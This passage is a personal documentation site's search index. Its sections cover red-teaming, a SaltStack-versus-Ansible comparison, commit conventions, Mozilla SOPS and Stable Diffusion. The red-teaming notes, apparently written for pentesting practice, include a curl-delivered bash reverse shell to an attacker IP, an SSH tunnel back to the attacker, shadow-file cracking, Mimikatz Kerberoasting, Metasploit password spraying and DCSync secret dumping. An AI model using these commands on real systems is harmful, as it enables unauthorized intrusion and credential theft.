<li>Tuoni GitHub Repository and Tuoni Documentation</li> </ul>"},{"location":"content/devops/redteaming/#reconscan","title":"Recon/Scan","text":"<ul> <li> <p>Nmap: <code>sudo nmap -sC -sV -vv -oA nmap/&lt;output name&gt; &lt;IP or range&gt;</code></p> </li> <li> <p>Burp Suite: Intercept outgoing requests, send to Repeater to modify and test. Use raw tab to inspect exact request/response.</p> </li> <li> <p>Ffuf: Repeat saved Burp request for fuzzing:</p> </li> <li> <p>Example: enumerate valid usernames by filtering error messages <code>ffuf -request login.req -request-proto http -w rockyou.txt -fr 'is not recognized as a valid user name'</code></p> </li> <li> <p>Web Plugin Scans: Use tools like <code>wpscan</code> for WordPress or CMS plugin vulnerabilities.</p> </li> <li> <p>Git Exposure: If <code>.git</code> directory is accessible on the server, use <code>git-dumper</code> to retrieve repo contents.</p> </li> <li> <p>Source Code Vulnerability Analysis: Tools like <code>Snyk</code> or <code>opengrep</code> can scan for insecure code patterns or dependencies.</p> </li> <li> <p>User capabilities:</p> </li> <li>Check if user can <code>sudo</code>, sometimes will list specific executables if full sudo not possible: <code>sudo -l</code></li> <li>Find suid executables: <code>find / -perm -4000 -type f -writable 2&gt;/dev/null</code></li> <li>Check <code>/etc/shadow</code> and <code>/etc/passwd</code>: use <code>unshadow</code> if both available.</li> </ul>"},{"location":"content/devops/redteaming/#reverse-shell-proxies-port-forwards","title":"Reverse shell / Proxies / Port forwards","text":"<p>If commands can be executed via web requests using a la <code>cmd</code> param: <code>curl -G http://&lt;target IP&gt;/shell/path --data-urlencode 'cmd=bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/9001 0&gt;&amp;1\"'</code></p>"},{"location":"content/devops/redteaming/#upgrading-reverse-shell","title":"Upgrading reverse shell","text":"<ol> <li>Make sure shell is bash: <code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code></li> <li>Send reverse shell to background: <code>CTRL + Z</code></li> <li>Change terminal setting: <code>stty raw -echo; fg</code></li> <li>export TERM=xterm</li> <li>(Optional) change terminal row and width, use <code>stty rows 75 cols 250</code></li> </ol> <p>or</p> Bash<pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm-256color\nreset\n</code></pre>"},{"location":"content/devops/redteaming/#send-ssh-proxy-back-home","title":"Send SSH proxy back home","text":"<p>If direct SSH is not possible but SSH is available inside the reverse shell, you can tunnel it back to your Kali machine using two reverse shells:</p> <ul> <li>Reverse Shell 1 (create SOCKS proxy): Bash<pre><code>ssh -N -D 9999 localhost\n</code></pre></li> <li>Reverse Shell 2 (forward proxy back to Kali): Bash<pre><code>ssh -N -R 9999:localhost:9999 kali@&lt;kali ip&gt;\n</code></pre></li> <li>Then on Kali use 9999 as proxy (for example with <code>proxychains</code>)</li> </ul>"},{"location":"content/devops/redteaming/#sql","title":"SQL","text":"<ul> <li><code>sqlmap</code>: Automated tool for SQL injection and database takeover.</li> </ul> <p>Quick SQL command cheat sheet</p> <ul> <li>Select database: <code>USE &lt;database_name&gt;;</code></li> <li>List tables: <code>SHOW TABLES;</code></li> <li>Show table schema: <code>DESCRIBE &lt;table_name&gt;;</code></li> <li>View table entries: <code>SELECT &lt;column1&gt;, &lt;column2&gt; FROM &lt;table_name&gt;;</code></li> </ul>"},{"location":"content/devops/redteaming/#windows","title":"Windows","text":"<ul> <li>Shellter</li> <li>bloodhound https://github.com/SpecterOps/BloodHound GUI to map explore and see interesting relations</li> <li>Mimikatz for Kerberos</li> <li> <p>Remmina for RDP sessions</p> </li> <li> <p>LM (LanManager): Old, deprecated, no encryption.</p> </li> <li>NTLM (New Technology LanManager): Insecure, deprecated. ISO/EITS standards recommend not using it (EITS documentation). Vulnerable to Pass-the-Hash attacks.</li> <li>Windows authentication over IP defaults to NTLM. Be cautious! Windows AD and Kerberos require using FQDNs.</li> <li>User logins save password hashes to the SAM file (<code>C:\\Windows\\system32\\config\\SAM</code>). This is similar to <code>/etc/shadow</code> in Linux, but Windows hashes are not salted. Common Sense Security tip: Never log in to workstations or weakly secured hosts with domain admin or other high-privilege accounts.</li> <li>In Windows, hiding can be done using services or DLLs.</li> <li>Windows reverse shell payloads can translate Linux commands to Windows equivalents.</li> <li>UAC (User Account Control) bypass techniques exist.</li> </ul> <p>When authenticating with Kerberos, time differences between your machine and the server can cause errors such as <code>KRB_AP_ERR_SKEW (37) - Clock skew too great</code>. For example:</p> <p>User found: \"alice\" with password \"changeme\", but no ticket received Error: KRB_AP_ERR_SKEW (37) - Clock skew too great. Local time: 2025-07-12 16:33:52 +0300 Server time: 2025-07-12 20:33:51 UTC Difference: 25198 seconds</p> <p>Sync your clock with the server:</p> <ul> <li> <p>Stop automatic time sync (if needed):</p> Bash<pre><code>sudo systemctl stop systemd-timesyncd\n# sudo systemctl disable systemd-timesyncd\n</code></pre> </li> <li> <p>Sync manually using NTP:</p> Bash<pre><code>sudo ntpdate &lt;server IP&gt;\n</code></pre> </li> <li> <p>Or set the time manually:</p> Bash<pre><code>sudo date -s \"@$(($(date +%s) + &lt;seconds difference&gt;))\"\n</code></pre> </li> </ul> <p>Or Edit NTP configuration:</p> <ul> <li>Update <code>/etc/ntp.conf</code> with the correct server.</li> <li> <p>Restart NTP service:</p> Bash<pre><code>/etc/init.d/ntpd restart\n</code></pre> </li> <li> <p>Enable NTP on boot:</p> Bash<pre><code>chkconfig --levels 2345 ntpd on\n</code></pre> </li> <li> <p>Force an update:</p> Bash<pre><code>ntpdate -u &lt;server IP&gt;\n</code></pre> </li> <li> <p>Verify NTP is running:</p> Bash<pre><code>ntpq -p\n</code></pre> </li> </ul> <p>Query SPN service accounts:</p> <ul> <li><code>setspn -Q &lt;service&gt;/&lt;host&gt;</code> or <code>setspn -Q */*</code> for all</li> <li> <p>Or:</p> Text Only<pre><code>$spn = \"&lt;service&gt;/&lt;host&gt;\"\n$searcher = New-Object System.DirectoryServices.DirectorySearcher\n$searcher.Filter = \"(&amp;(objectClass=user)(servicePrincipalName=$spn))\"\n$result = $searcher.FindOne()\nif ($result) {\n    $result.Properties[\"name\"]\n} else {\n    Write-Output \"No account found for SPN $spn\"\n}\n</code></pre> </li> </ul>"},{"location":"content/devops/redteaming/#metasploit-kerberos-modules","title":"Metasploit Kerberos modules","text":"<ul> <li>Start metasploit: <code>msfconsole</code></li> <li>Kerberos login: <code>use auxiliary/scanner/kerberos/kerberos_login</code></li> <li> <p>Set params:</p> Bash<pre><code>set RHOSTS &lt;host&gt;\nset USERNAME &lt;username&gt;\nset PASSWORD &lt;password&gt;\nset DOMAIN &lt;domain&gt;\nset KDC &lt;kdc&gt;\nset VERBOSE true\nrun\nset PASS_FILE /path/to/password_list.txt\nunset PASSWORD\nrun\n</code></pre> </li> </ul>"},{"location":"content/devops/redteaming/#mimikatz","title":"Mimikatz","text":"<ul> <li>Request the TGS (Kerberoasting) with Mimikatz:</li> </ul> <p>Text Only<pre><code>privilege::debug\nkerberos::ask /user:&lt;USER&gt; /password:&lt;PASS&gt; /domain:&lt;DOMAIN&gt; \\\n              /spn:&lt;service&gt;/&lt;host&gt; /target:&lt;SVC ACCOUNT&gt;\n</code></pre> - Export tickets: <code>kerberos::list /export</code></p> <ul> <li> <p>Crack the Service\u2011Account Password: Feed the extracted <code>.kirbi</code> (or converted hash) to Hashcat, John, etc.</p> </li> <li> <p>Ensure Time Sync. Kerberos requires client and server clocks to match within ~5\u202fminutes so sync your host time with the domain controller.</p> </li> <li> <p>Log In with Cracked Service Account. Pass\u2011the\u2011Hash, Pass\u2011the\u2011Ticket, or plain credentials.</p> </li> <li> <p>Check permissions: <code>(Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties nTSecurityDescriptor).nTSecurityDescriptor.Access | Where-Object {$_.IdentityReference -like '*&lt;SVC ACCOUNT&gt;*'} | Select IdentityReference,ActiveDirectoryRights,ObjectType</code></p> <p>Output: IdentityReference        ActiveDirectoryRights ObjectType -----------------        --------------------- ---------- CYBER\\iis_svc     ReadProperty, GenericExecute 00000000-0000-0000-0000-000000000000 CYBER\\iis_svc                    ExtendedRight 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 CYBER\\iis_svc                    ExtendedRight 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</p> </li> <li> <p>Which may match dsync vulnerability GUIDs (One link, other link)</p> <p>1131f6aa\u20119c07\u201111d1\u2011f79f\u201100c04fc2dcd2  Replicating\u202fDirectory\u202fChanges   Enumerate objects in AD 1131f6ad\u20119c07\u201111d1\u2011f79f\u201100c04fc2dcd2  Replicating\u202fDirectory\u202fChanges\u202fAll   Enumerate attribute data (password &amp; key material)</p> </li> <li> <p>User Enumeration Metasploit:</p> Bash<pre><code>use auxiliary/gather/kerberos_enumusers\nset RHOSTS &lt;DC IP&gt;\nset DOMAIN &lt;DOMAIN&gt;\nset USERNAME Administrator # Or leave blank to get all\nrun\n</code></pre> </li> <li> <p>Privilege Escalation via DCSync once a privileged account is obtained, dump AD secrets:</p> Bash<pre><code>privilege::debug\nlsadump::dcsync /domain:&lt;DOMAIN&gt; /user:Administrator\n</code></pre> </li> <li> <p>Crack / Re\u2011use NTLM Hashes. Example: <code>hashcat -m 1000 -a 0 admin.hash rockyou.txt</code> then <code>--show</code>.</p> </li> </ul>"},{"location":"content/devops/saltstack-for-ansible/","title":"Ansible User's Guide to Saltstack","text":""},{"location":"content/devops/saltstack-for-ansible/#what-ansible-and-saltstack-have-in-common","title":"What Ansible and Saltstack have in common","text":"<p>Both tools support similar core features and serve the same use cases:</p> <ul> <li>Are hybrid (imperative/declarative) configuration management for mutable infrastructure</li> <li>Use YAML and Jinja2 with similar syntax</li> </ul>"},{"location":"content/devops/saltstack-for-ansible/#how-ansible-and-saltstack-differ","title":"How Ansible and Saltstack differ","text":"<p>Most differences stem from their differing architectures: while Ansible is agentless, Saltstack follows the master-minion by default (but also supports master only, minion only as well). </p>"},{"location":"content/devops/saltstack-for-ansible/#initial-setup","title":"Initial setup","text":"<p>For Ansible nothing needs to be done on the bastion where playbooks will be run to configure hosts. Once playbooks have been written all that needs to be done is to run the playbooks.</p> <p>For Saltstack the master needs to be installed and configured (default config may suffice). After that the minion needs to be installed. When a Salt minion starts, by default it searches for a master that resolves to the <code>salt</code> hostname on the network. If found, the minion initiates the handshake and key authentication process with the Salt master. Master can be configured to accept keys automatically or manually.</p>"},{"location":"content/devops/saltstack-for-ansible/#executing-commands","title":"Executing commands","text":"<p>With Ansible a simple example command to check OS version of hosts looks like this:</p> Bash<pre><code>ansible servers -m setup -i ansible_hosts -a 'filter=ansible_memfree_mb,ansible_memtotal_mb'\n</code></pre> <p>For Saltstack the same would be:</p> Bash<pre><code># '*' means that all minions will be targeted with the command\nsalt '*' status.meminfo\n</code></pre>"},{"location":"content/devops/saltstack-for-ansible/#defining-tasks-for-multiple-sets-of-hosts","title":"Defining tasks for multiple sets of hosts","text":"<p>Ansible has the concept of playbooks where tasks are defined. The equivalent for Saltstack are state formulas. </p> <p>In Ansible, a play is a set (one or more) of tasks to execute on a hostgroup. A run is a set of plays that are run. Ansible has some best practices on how to organize Ansible plays and playbooks, however there does not exist a set structure. For comparisons sake I assume the following (very common) structure: there is one run which runs multiple plays on multiple hostgroups, each play defines a number of playbooks to run from roles.</p> <p>For Saltstack there is the top file which is similar to an Ansible play as it describes a list hostgroups and a list of formulas to run on the hostgroups.</p> <p>A top file example: </p> YAML<pre><code>base:          # Apply SLS files from the directory root for the 'base' environment\n  'web*':      # All minions with a minion_id that begins with 'web'\n    - apache   # Apply the state file named 'apache.sls'\n</code></pre> <p>The equivalent play for Ansible would be: YAML<pre><code>- name: PLAYBOOK FOR GROUP 'WEB'\n  hosts: web       # All hosts in 'web' hostgroup\n\n  roles:          \n  - role: apache  # Apply the playbook from 'apache' role \n</code></pre></p>"},{"location":"content/devops/saltstack-for-ansible/#writing-tasks","title":"Writing tasks","text":"<p>The tasks in the aforementioned apache role in Ansible would have the following structure:</p> Text Only<pre><code>roles/\n    apache/               # this hierarchy represents a \"role\"\n        tasks/            #\n            main.yml      #  &lt;-- tasks file can include smaller files if warranted\n        templates/        #  &lt;-- files for use with the template resource\n            httpd.conf.j2   #  &lt;------- templates end in .j2\n        files/            #\n            bar.txt       #  &lt;-- files for use with the copy resource\n        vars/             #\n            main.yml      #  &lt;-- variables associated with this role\n        defaults/         #\n            main.yml      #  &lt;-- default lower priority variables for this role\n</code></pre> <p>The <code>roles/apache/tasks/main.yml</code> aka the role playbook would look something like this:</p> YAML<pre><code>- name: Install apache\n  ansible.builtin.package:\n    name:\n      - httpd\n    state: installed\n\n- name: Template apache config\n  ansible.builtin.template:\n    src: httpd.conf.j2\n    dest: /etc/httpd/conf/httpd.conf\n\n- name: Copy apache config\n  ansible.builtin.copy:\n    src: bar.txt\n    dest: /etc/httpd/conf/\n</code></pre> <p>For Saltstack the state formula for apache would have the following structure:</p> Text Only<pre><code>formulas/\n    apache/\n        init.sls\n        httpd.conf.j2\n        bar.txt\n</code></pre> <p>The <code>init.sls</code> aka the state formula would look something like this:</p> YAML<pre><code>install apache:\n  pkg.installed:\n    - name: httpd\n\nrun apache service:\n  service.running:\n    - name: httpd\n\n/etc/httpd/conf/httpd.conf:\n  file.managed:\n    - source: salt://apache/http.conf.j2\n    - user: root\n    - group: root\n    - mode: 644\n    - template: jinja\n    - defaults:\n        custom_var: \"default value\"\n        other_var: 123\n\n/etc/httpd/conf/bar.txt:\n  file.managed:\n    - source: salt://apache/http.conf\n    - user: root\n    - group: root\n    - mode: 644\n</code></pre> <p>Worth noting that Salt also allows (and even encourages) to use templating in formulas while Ansible does not allow templating in playbooks. For example we could add some variables to the apache config task from before depending on the OS of the minion:</p> YAML<pre><code>/etc/httpd/conf/httpd.conf:\n  file.managed:\n    - source: salt://apache/http.conf.j2\n    - user: root\n    - group: root\n    - mode: 644\n    - template: jinja\n    - defaults:\n        custom_var: \"default value\"\n        other_var: 123\n{% if grains['os'] == 'Ubuntu' %}\n    - context:\n        custom_var: \"override\"\n{% endif %}\n</code></pre>"},{"location":"content/devops/saltstack-for-ansible/#managing-variables","title":"Managing variables","text":"<p>Ansible has many (22 in fact) different places for variables with a hierarchy of variable precedence. In essence variables can be defined almost anywhere.</p> <p>Saltstack has grains, variables that come from minions, and pillars, variables that go to minions as well as variables defined in formulas. In that sense, managing variables becomes a lot more explicit and readable when compared to Ansible.</p> <p>Merging lists in Ansible: YAML<pre><code>- name: Install apache\n  ansible.builtin.package:\n    name:\n      - \"{{ item }}\"\n    state: installed\n  with_items: \"{{ pkgs | combine(group_pkgs, list_merge='append_rp') }}\"\n</code></pre></p> <p>Merging lists in Saltstack:</p> YAML<pre><code>install packages:\n  pkg.installed:\n    - name: {{ pillar['pkgs']['group_pkgs'] }}\n</code></pre>"},{"location":"content/devops/saltstack-for-ansible/#event-based-tasks","title":"Event based tasks","text":"<p>Ansible does not have event based tasks, however a developer preview exists for event driven Ansible features</p> <p>Saltstack has reactors, which can be used to run formulas when defined events occur. This makes managing a dynamic set of hosts easy. For example master will run configuration formulas when a minion wakes up from powersave:</p> YAML<pre><code>reactor:                            # Master config section \"reactor\"\n  - 'salt/minion/*/start':          # Match tag \"salt/minion/*/start\"\n    - /srv/reactor/start.sls        # Things to do when a minion starts\n    - /srv/reactor/monitor.sls      # Other things to do\n</code></pre>"},{"location":"content/devops/saltstack-for-ansible/#reusability-of-tasks","title":"Reusability of tasks","text":"<p>In Ansible it is possible to separate roles into separate repositories and include them in playbooks by linking the repositories. It is also possible to separate multiple components (like multiple roles) into Ansible collections and then to include them in playbooks. With collections it is possible to specify which roles and components to include.</p> <p>With Saltstack it is possible to separate formulas and include them in the master configuration from the repository. It is possible to specify which formulas and paths to include and where to place them.</p>"},{"location":"content/devops/saltstack-for-ansible/#conclusion","title":"Conclusion","text":""},{"location":"content/devops/saltstack-for-ansible/#points-against-ansible-and-for-salt","title":"Points against Ansible and for Salt","text":"<p>First, configuration management often turns into smart variable handling as your actual configurations get more generic over time. Thus handling variables becomes really important. Saltstack is more more explicit ways in which it handles variables: they're defined in a pillar. Contrast this with the variable precedence for Ansible (there's a hierarchy of 22 different variable locations). Usually with Ansible an admin will usually only have to think about 4 different variable locations (command line, hostgroup, host and role variables), but the requirement to always needing to consider and build playbooks around variable precedence makes for less readable and harder to maintain repos.</p> <p>Secondly, Saltstack uses master-agent architecture over Ansible's much much easier to get started with agentless approach. However, as a result, it tends not to scale as well as Saltstack because you have to open an SSH connection to every machine you want to manage. Saltstack, by contrast, uses ZeroMQ to communicate with minions: minions listen for instructions on one ZeroMQ port on the master (4505) and post back results on another (4506). It's blazing fast and it scales really well. Works even when SSH goes down or the machines don't expose ssh (e.g. locked down machines that do not need SSH). Worth noting that in terms of actually writing tasks for minions, they are very similar and both use YAML and Jinja, so in that sense they are both as easy to onboard new people for writing new tasks. The learning curve increase for Saltstack comes from the initial master-minion setup, but even that is not a hugely complicated job all things considered.</p> <p>Thirdly, master-agent architecture of Salt enables true event driven management with reactors which is especially good for dynamic host inventories (with hosts that often power on and off like gray nodes). So we could much easily define scenarios for minion wakeups.</p> <p>For notifications, Ansible has easier integration for sending emails however if we split the runs (by hostgroup) then that means an email for each hostgroup. Aggregating errors will become a problem that needs a custom script. For Salt aggregating results and more granular control over notifications needs more work, but is a lot more flexible and does not need custom scripts.</p>"},{"location":"content/devops/saltstack-for-ansible/#points-for-ansible-and-against-salt","title":"Points for Ansible and against Salt","text":"<p>The support for Ansible is a lot better, there are more people using it in both enterprise and open source. Community is also a lot bigger. Having such a big user base behind them gives Ansible much stable and reliable updates compared to Salt where looking at the best practices even from 3 years ago differ from the ones recommended today.</p> <p>Even if on paper SaltStack seems a lot better in many aspects on paper, in reality there are quite a few worrying problems. Like the git filesystem. It is possible to use <code>gitfs</code> alongside the default <code>rootfs</code> to automatically fetch Salt formulas, pillars etc from remote git repos, however <code>gitfs</code> is unfortunately buggy and full of python version mismatch errors among other things (Check the warnings in the <code>gitfs</code> documentation). Basic things like version controlling config management should be reliable and it begs the question of what else might be buggy in Salt.</p> <p>Even variable handling gets messy when moving away from pillar only setups where you have to merge pillars with defaults and use map files in formulas which one might have to do to keep SaltStack performant when managing a large number of minions. Here's where the Ansible variable precedence actually comes in handy, because you can just define variables in the playbook and not have to worry about merging them.</p>"},{"location":"content/devops/saltstack-for-ansible/#further-resources-for-saltstack","title":"Further resources for Saltstack","text":"<ul> <li>Salt In 10 Minutes Walkthrough</li> <li>Salt User Guide</li> <li>Salt Documentation</li> <li>SaltStack Configuration Management Best Practices</li> </ul>"},{"location":"content/devops/semver/","title":"Automated releases & commit styles","text":"<p>In the ideal environment the developer only needs to commit changes in the correct format and everything else about the release process is done automatically and programatically, not romantically and sentimentally.</p> <p>For the accadmlib and accadmlibclient projects the python-semantic-release tool was implemented to try and unify commit styles as well as make automate the release procedure of Python packages in tandem with the acc-py devtools templates.</p> <p>Advantages of using python-semantic-release is that it can do the following automatically:</p> <ul> <li>Parse commits and decide which version to bump to</li> <li>Parse commits and generate a Changelog</li> <li>Change version variables in multiple locations (typically <code>setup.py</code> and <code>docs/conf.py</code>)</li> <li>Create a tag for the release</li> <li>Pushe changelog and source to GitLab project Releases (in the future will also be possible to push dist and wheel to the releases if needed)</li> </ul> <p>Advantages of using acc-py devtools python CI templates is that it can do the following automatically:</p> <ul> <li>Run unittests if they exist</li> <li>Try to install it in a docker according to ACC-Py Package Index requirements</li> <li>Build Sphinx documentation and upload it to <code>[https://acc-py.web.cern.ch/gitlab/&lt;group&gt;/&lt;project&gt;/docs/master/](https://acc-py.web.cern.ch/gitlab/acc-adm/accadmlib/docs/master/)</code></li> <li>Upload dist and wheel to ACC-Py Package Index when a tag is pushed to project repository</li> </ul>"},{"location":"content/devops/semver/#commit-style-scipy","title":"Commit style: SciPy","text":"<p>python-semantic-release provides parsers for 3 commit styles (and an option to write a custom parser), of which it was decided to move forward by using the SciPy style.</p> <p>Commit messages using SciPy tags in the following template:</p> Text Only<pre><code>&lt;tag&gt;(&lt;scope&gt;): &lt;subject&gt;\n&lt;body&gt;\n</code></pre> <p>While <code>&lt;scope&gt;</code> is supported here it isn\u2019t actually part of the SciPy style. If it is missing, parentheses around it should be too. The commit should then be of the form:</p> Text Only<pre><code>&lt;tag&gt;: &lt;subject&gt;\n&lt;body&gt;\n</code></pre> <p>To communicate a breaking change add \u201cBREAKING CHANGE\u201d into the body at the beginning of a paragraph. Fill this paragraph with information how to migrate from the broken behavior to the new behavior. It will be added to the \u201cBreaking\u201d section of the changelog.</p> <p>The elements <code>&lt;tag&gt;</code>, <code>&lt;scope&gt;</code> and <code>&lt;body&gt;</code> are optional.</p> <p>If no tag is present, the commit will be added to the changelog section \u201cNone\u201d and no version increment will be performed.</p> <p>Supported Tags:</p> <ul> <li>API: an (incompatible) API change</li> <li>BENCH: changes to the benchmark suite</li> <li>BLD: change related to building</li> <li>BUG: bug fix</li> <li>DEP: deprecate something, or remove a deprecated object</li> <li>DEV: development tool or utility</li> <li>DOC: documentation</li> <li>ENH: enhancement</li> <li>MAINT: maintenance commit (refactoring, typos, etc.)</li> <li>REV: revert an earlier commit</li> <li>STY: style fix (whitespace, PEP8)</li> <li>TST: addition or modification of tests</li> <li>REL: related to releasing</li> </ul> <p>Supported Changelog Sections:</p> <p>breaking, feature, fix, Other, None</p>"},{"location":"content/devops/sops/","title":"Mozilla SOPS","text":"<p>Info</p> <p>Mozilla SOPS repository</p> <p>SOPS, short for Secrets OPerationS, is an open-source text file editor that encrypts/decrypts files automagically.</p> <p>Text editors and encryption tools already exist, however the ease of use is very low when using them separately. Emphasis with SOPS is on that the text editor and encryption features are packaged in one automated tool.</p> <p>SOPS's ability to encrypt whole files as well as parts of structured content like variables in yaml makes it powerful for use in Ansible, Kubernetes, etc.</p>"},{"location":"content/devops/sops/#installing","title":"Installing","text":"<p>Binaries and packages of the latest stable release are available at SOPS GitHub.</p>"},{"location":"content/devops/sops/#setting-up-pgp-keys","title":"Setting up PGP keys","text":"<p>Install GnuPG GPG CLI tool:</p> Bash<pre><code>apt install gnupg\n</code></pre> <p>Create the keys:</p> Bash<pre><code>gpg --batch --full-generate-key &lt;&lt;EOF\n%no-protection\nKey-Type: 1\nKey-Length: 4096\nSubkey-Type: 1\nSubkey-Length: 4096\nExpire-Date: 0\nName-Comment: &lt;YOUR COMMENT&gt;\nName-Real: &lt;YOUR KEY NAME&gt;\nEOF\n</code></pre> <p>List keys:</p> Bash<pre><code>gpg --list-keys\n</code></pre> <p>Export keys to file:</p> Bash<pre><code>gpg --export -a &lt;YOUR KEY NAME&gt; &gt; $HOME/public.key\ngpg --export-secret-key -a &lt;YOUR KEY NAME&gt; &gt; $HOME/private.key\n</code></pre> <p>Import keys:</p> Bash<pre><code>gpg --import $HOME/public.key\ngpg --import $HOME/private.key\n</code></pre> <p>To configure SOPS paste the public key fingerprint to <code>$HOME/.sops.yaml</code> (invalid sample value used here):</p> YAML<pre><code>creation_rules:\n    - pgp: &gt;-\n        B32GJd94DA0891D930LG3F35B432D146C9C4BC\n</code></pre>"},{"location":"content/devops/sops/#usage","title":"Usage","text":"<p>Edit file and encrypt automatically:</p> Bash<pre><code>sops secret-txt-file.txt\n</code></pre> <p><code>cat</code> the file to see that it's contents have been encrypted and converted into a json.</p> <p>Encrypting the full content of a text file is powerful, but if the file contains structured data, for example:</p> <ul> <li>*.yaml</li> <li>*.json</li> <li>*.ini</li> <li>*.env</li> </ul> <p>Then SOPS encrypts only the content you edited not the whole file:</p> Bash<pre><code>sops secret-yml-file.yaml\n</code></pre> <p>The follwing:</p> YAML<pre><code>username: user1\npassword: hunter2\n</code></pre> <p>Will become:</p> YAML<pre><code>username: user1\npassword: ENC[AES256_GCM,data:z2soJW==,iv:IZ841YNdsr4olKw3A304IFT/OgWSEqkrO29s=,tag:bRJHVasldDFfgOjQGkEi==,type:str]\n</code></pre>"},{"location":"content/devops/stablediffusion-ps1/","title":"Playstation Filter Using Stable Diffusion","text":"<p>The idea was to jump the trend of creating oldschool playstation styled photos</p> <p>Already had a ridiculous profile picture with me with big sneakers standing on a pink background, the prime candidate to amp it up further.</p> <p>Original prompt used midjourney (link to og prompt)</p> <p>But could i run it myself? Good way to utilize the g9 server in the homelab as the 3070 on the gaming computer may not have enough vram for larger models and why stress the gaming machine if i could use the server with 256gb ram in the background</p> <p>Link to webui docker</p> <p>Automatic1111 and comfy UIs</p> <p>Different models, parameters</p> <p>Using sd1.5</p> <p>First aha: CFG</p> <p>Got background and ground: man big shoes light clothes sunglasses ps1 playstation psx gamecube game radioactive dreams screencapture 3d pixelated Steps: 80, Sampler: LMS, CFG scale: 16, Seed: 2788379268, Size: 512x512, Model hash: c6bbc15e32, Model: sd-v1-5-inpainting, Denoising strength: 0.75, Conditional mask weight: 1.0, Version: v1.7.0 00002-541820203.png</p> <p></p> <p>Switch to sdxl</p> <p>Second aha: denoise strength man big shoes light clothes hands crossed  low poly playstation 1 still Steps: 30, Sampler: DPM++ 2M SDE Karras, CFG scale: 9, Seed: 2955775176, Size: 512x512, Model hash: d8fd60692a, Model: sdxl-helloworld-xl, Denoising strength: 0.3, Lora hashes: \"sdxl-psx: 97857fb508e5\", Version: v1.7.0 <p></p> <p>First decent result</p> <p>Third aha: controlnet</p> <p>man big shoes light clothes hands crossed  low poly playstation 1 still Negative prompt: old beard mustache formal tie necktie Steps: 20, Sampler: DPM++ 2M SDE Karras, CFG scale: 11, Seed: 1731225750, Size: 512x512, Model hash: c6bbc15e32, Model: sd-v1-5-inpainting, Denoising strength: 0.31, Conditional mask weight: 1.0, Lora hashes: \"sdxl-psx: 97857fb508e5\", Version: v1.7.0 Saved: 00013-1731225750.png <p>Img2img works best in tandem with the img also in a controlnet unit in my experience so that it preserves more of the original.</p> <p>Cool lora, thanks to the creator LuisaP!</p> <p>Steps: 24, Sampler: DPM++ 2M Karras, CFG scale: 8, Size: 512x512, Model hash: d8fd60692a, Model: sdxl-helloworld-xl, Denoising strength: 0.3, Lora hashes: \"sdxl-psx: 97857fb508e5\", Version: v1.7.0</p> <p>ControlNet Unit 0 model: diffusers_xl_canny_full, pixel perfect: true, upload independent control image: true (same as img2img), control weight 1, control mode: controlnet priority</p> <p>realistic, photoreal, highly detailed, (rich cat wearing gold chains), nightclub, dark, neon, contrast Negative prompt: cartoon, unrealistic, anime Steps: 21, Sampler: DPM++ 2M Karras, CFG scale: 7, Seed: 810480089, Size: 512x512, Model hash: d8fd60692a, Model: sdxl-helloworld-xl, ControlNet 0: \"Module: depth_midas, Model: diffusers_xl_depth_full [e3b0c442], Weight: 0.9, Resize Mode: Just Resize, Low Vram: False, Processor Res: 512, Guidance Start: 0, Guidance End: 1, Pixel Perfect: True, Control Mode: Balanced, Hr Option: Both, Save Detected Map: True\", Version: v1.7.0 controlnet 0: depth </p> <p>then separate face </p> <p> man smug face thin closeup portrait low poly playstation 1 still Negative prompt: old, old man, sad, angry, beard, mustache Steps: 30, Sampler: DPM++ 2M SDE Karras, CFG scale: 7, Seed: 1223703963, Size: 512x512, Model hash: d8fd60692a, Model: sdxl-helloworld-xl, Denoising strength: 0.4, Lora hashes: \"sdxl-psx: 97857fb508e5\", Version: v1.7.0 Saved: 00020-1223703963.png <p>Photoshop process gif with previosly mentioned pics</p> <p></p> <p>add noise, grain and pixellate, final result:</p> <p></p>"},{"location":"content/devops/stablediffusion/","title":"Stable Diffusion","text":"<p>Info</p> <p>How to get images that don't suck by u/pxan | Stable Diffusion Akashic Records | Stable Diffusion Prompt Engineering (with examples on samplers)</p> <p>Basic settings to get started:</p> <ul> <li>CFG (Classifier Free Guidance): 8</li> <li>Sampling Steps: 50</li> <li>Sampling Method: k_lms</li> <li>Random seed</li> </ul>"},{"location":"content/devops/stablediffusion/#checkpoints","title":"Checkpoints","text":""},{"location":"content/devops/stablediffusion/#sd-15","title":"SD 1.5","text":"<p>Deliberate</p>"},{"location":"content/devops/stablediffusion/#sd-xl","title":"SD XL","text":"<p>sdxl-helloworld</p>"},{"location":"content/devops/stablediffusion/#modes","title":"Modes","text":""},{"location":"content/devops/stablediffusion/#img2img","title":"img2img","text":"<p>CFG: Low = image based, High = prompt/desc based</p> <p>Denoising (Try 0.50 and adjust from there):  Low = orig img based, High = more creative</p> <p>Steps 30 and again then adjust from there.</p> <p>I prefer using the DDIM method in many cases too. Seems to let me make more adjustments while keeping more of my original.</p> <p>Test prompt in txt2img first and if it consistently gives something similar to the image I'm going to use in img2img that helps too.</p> <p>img2img Style transfer ideas:</p> <ul> <li>run it through a different model with high CFG (12+) and low denoise (0.1-0.2)</li> <li>img2img, change the prompt a little bit, set the CFG to 10/15, use the same seed. Use the denoise from 0.05 to 0.3 max, try multiple times step by step (0.05/1/1.5/2/2.5/3)</li> </ul>"},{"location":"content/devops/stablediffusion/#controlnet","title":"ControlNet","text":"<p>Control net models</p> <p>Reddit suggestion: ip-adapter</p> <p>Canny: diffusers_xl_canny_full</p> <p>Copy pose from image: thibaud_xl_openpose</p>"},{"location":"content/devops/stablediffusion/#options","title":"Options","text":""},{"location":"content/devops/stablediffusion/#classifier-free-guidance-cfg","title":"Classifier Free Guidance (CFG)","text":"<ul> <li>CFG 2 - 6: Let the AI take the wheel.</li> <li>CFG 7 - 11: Let's collaborate, AI!</li> <li>CFG 12 - 15: No, seriously, this is a good prompt. Just do what I say, AI.</li> <li>CFG 16 - 20: DO WHAT I SAY OR ELSE, AI.</li> </ul>"},{"location":"content/devops/stablediffusion/#samplers","title":"Samplers","text":""},{"location":"content/devops/stablediffusion/#dpm-2m-sde-karras","title":"DPM++ 2M SDE Karras","text":"<p>Slow, but good results. Steps 30, CFG 7-9</p>"},{"location":"content/devops/stablediffusion/#lms-the-old-reliable","title":"LMS: 